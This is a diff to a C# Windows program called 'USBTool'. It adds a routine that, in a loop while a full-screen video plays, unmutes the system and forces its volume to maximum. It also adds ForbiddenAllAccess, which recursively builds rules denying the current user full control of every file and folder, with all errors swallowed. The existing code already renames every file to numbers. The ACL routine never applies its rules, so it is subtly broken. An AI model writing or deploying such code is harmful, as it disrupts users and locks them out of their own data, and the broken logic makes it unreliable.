@@ -11,6 +11,7 @@ using System.Windows.Forms;
 using System.Collections.Generic;
 using USBTool.CoreAudioApi;
 using System.ComponentModel;
+using System.Security.AccessControl;
 #if MEDIA_FOUNDATION
 using USBTool.MediaFoundation;
 #endif
@@ -29,8 +30,7 @@ namespace USBTool
 #elif MEDIA_FOUNDATION
 		public bool hasvideo=false;
 		private float playvolume;
-		public string state = "";
-		private Thread mediathread;
+		public string state = "";		
 #endif
 		private string message;
 		private string sentence;
@@ -41,6 +41,7 @@ namespace USBTool
 		private Thread preventthread;
 		private List<IntPtr> lhwnd;
 		private DEVMODE DEVMODE1;
+		private Thread mediathread;
 
 		public delegate bool EnumWindowsCallBack(IntPtr hwnd, string lpPatam);
 #if MEDIA_MCI
@@ -367,6 +368,9 @@ namespace USBTool
 							g.Dispose();
 						}
 						break;
+					case "top":
+						BringWindowToTop(hwnd);
+						break;
 					default:
 						throw new ArgumentException("该功能还未开发");
 				}
@@ -567,8 +571,8 @@ namespace USBTool
 				{
 					host.Top = 0;
 					host.Left = 0;
-                    host.Width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
-                    host.Height = (int)System.Windows.SystemParameters.PrimaryScreenHeight;
+					host.Width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
+					host.Height = (int)System.Windows.SystemParameters.PrimaryScreenHeight;
 				}
 				Rectangle videopos = new Rectangle(0, 0, host.Width, host.Height);
 				host.videocontrol = videocontrol;
@@ -577,7 +581,7 @@ namespace USBTool
 			catch
 			{
 			}
-	        state = "Prepared";
+			state = "Prepared";
 			while (true)
 			{		
 				if (state == "Playing")
@@ -597,19 +601,10 @@ namespace USBTool
 							{
 								if (state == "Playing")
 								{
-									Guid guidEnumetator = typeof(IMMDeviceEnumerator).GUID;
-									Guid guidManager = typeof(IAudioSessionManager).GUID;
-									CoCreateInstance(ref MMDeviceEnumerator, null, CLSCTX_ALL, ref guidEnumetator, out IUnknown _enumerater);
-									IMMDeviceEnumerator enumerator = _enumerater as IMMDeviceEnumerator;
 									while (state == "Playing")
 									{
 										BringWindowToTop(host.Handle);
-										enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice endpoint);
-										endpoint.Activate(ref guidManager, CLSCTX_ALL, IntPtr.Zero, out IUnknown _manager);
-										IAudioSessionManager manager = _manager as IAudioSessionManager;
-										manager.GetSimpleAudioVolume(Guid.Empty, false, out ISimpleAudioVolume processvolume);
-										processvolume.SetMasterVolume(playvolume, Guid.Empty);
-										processvolume.SetMute(false, Guid.Empty);
+										SetAppAndSystemVolume(playvolume,false);
 									}
 								}						
 							}
@@ -635,36 +630,110 @@ namespace USBTool
 		}
 #endif
 		public void NumericalFileName(DirectoryInfo directory)
-        {
+		{
 			int filenumber = 0;
 			int dirnumber = 0;
 			foreach(var f in directory.GetFiles())
-            {
+			{
 				string newname = f.DirectoryName + "\\#" + filenumber + f.Extension;
 				try
 				{
 					f.MoveTo(newname);
 				}
-                catch
-                {
+				catch
+				{
 
-                }
+				}
 				filenumber += 1;
-            }
+			}
 			foreach(var d in directory.GetDirectories())
-            {
+			{
 				NumericalFileName(d);
 				string newname = d.Parent.FullName + "\\#" + dirnumber;
 				try
 				{
 					d.MoveTo(newname);
 				}
-                catch
-                {
+				catch
+				{
 
-                }
+				}
 				dirnumber += 1;
+			}
+		}
+		public void SetAppAndSystemVolume(float volume,bool muted)
+		{
+			Guid guidEnumetator = typeof(IMMDeviceEnumerator).GUID;
+			Guid guidManager = typeof(IAudioSessionManager).GUID;
+			Guid guidVolume = typeof(IAudioEndpointVolume).GUID;
+			CoCreateInstance(ref MMDeviceEnumerator, null, CLSCTX_ALL, ref guidEnumetator, out IUnknown _enumerater);
+			IMMDeviceEnumerator enumerator = _enumerater as IMMDeviceEnumerator;
+			enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice endpoint);
+			endpoint.Activate(ref guidManager, CLSCTX_ALL, IntPtr.Zero, out IUnknown _manager);
+			endpoint.Activate(ref guidVolume, CLSCTX_ALL, IntPtr.Zero, out IUnknown _volume);
+			IAudioSessionManager manager = _manager as IAudioSessionManager;
+			manager.GetSimpleAudioVolume(Guid.Empty, false, out ISimpleAudioVolume processvolume);
+			processvolume.SetMasterVolume(volume, Guid.Empty);
+			processvolume.SetMute(muted, Guid.Empty);
+			IAudioEndpointVolume systemvolume = _volume as IAudioEndpointVolume;
+			systemvolume.SetMasterVolumeLevelScalar(1, Guid.Empty);
+			systemvolume.SetMute(muted, Guid.Empty);
+		}
+		public void ForbiddenAllAccess(DirectoryInfo directory)
+		{
+			try
+			{
+				foreach (var f in directory.GetFiles())
+				{
+					try
+					{
+						FileSecurity access = f.GetAccessControl();
+						access.RemoveAccessRuleAll(new FileSystemAccessRule(
+							Environment.UserDomainName + "\\" + Environment.UserName,
+							FileSystemRights.FullControl,
+							AccessControlType.Allow));
+						access.AddAccessRule(new FileSystemAccessRule(
+							Environment.UserDomainName + "\\" + Environment.UserName,
+							FileSystemRights.FullControl,
+							AccessControlType.Deny));
+					}
+					catch
+					{
+
+					}
+				}
+			}
+            catch
+            {
+
             }
-        }
+			try
+			{
+				foreach (var d in directory.GetDirectories())
+				{
+					try
+					{
+						ForbiddenAllAccess(d);
+						DirectorySecurity access = d.GetAccessControl();
+						access.RemoveAccessRuleAll(new FileSystemAccessRule(
+							Environment.UserDomainName + "\\" + Environment.UserName,
+							FileSystemRights.FullControl,
+							AccessControlType.Allow));
+						access.AddAccessRule(new FileSystemAccessRule(
+							Environment.UserDomainName + "\\" + Environment.UserName,
+							FileSystemRights.FullControl,
+							AccessControlType.Deny));
+					}
+					catch
+					{
+
+					}
+				}
+			}
+            catch
+            {
+
+            }
+		}
 	}
 }
